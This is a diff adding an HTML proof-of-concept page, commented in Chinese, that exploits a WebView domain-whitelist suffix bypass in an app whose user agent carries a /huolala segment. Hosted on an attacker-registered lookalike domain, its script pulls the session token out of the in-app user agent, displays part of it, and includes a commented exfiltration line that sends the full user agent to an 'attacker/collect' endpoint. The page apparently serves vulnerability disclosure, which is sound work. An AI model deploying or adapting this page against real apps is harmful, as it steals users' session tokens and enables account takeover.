@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h3>XLSRC PoC - WebView Whitelist Suffix Bypass</h3>
+<p>此页面部署于攻击者注册的后缀域名（如 evilxiaolachuxing.com）</p>
+<pre id="o" style="background:#000;color:#0f0;padding:10px;word-break:break-all;"></pre>
+<div id="tok" style="color:#f33;font-weight:bold;"></div>
+<script>
+try {
+  const ua = navigator.userAgent;
+  document.getElementById('o').textContent = ua;
+  const m = ua.match(/\/huolala\(([^)]*)\)/);
+  if (m) {
+    const parts = m[1].split(',');
+    // 字段: 版本,android,渠道,ver,机型,设备id,TOKEN,userfid,build
+    if (parts.length >= 7) {
+      document.getElementById('tok').textContent = '[+] UA含token段: ' + parts[6].slice(0,8) + '...(已确认泄露)';
+      // 实际攻击场景回传: new Image().src='https://attacker/collect?ua='+encodeURIComponent(ua);
+    }
+  } else {
+    document.getElementById('tok').textContent = '[-] UA不含/huolala段(未走内部域名分支)';
+  }
+} catch(e) { document.getElementById('o').textContent = 'err:'+e; }
+</script>
+</body>
+</html>
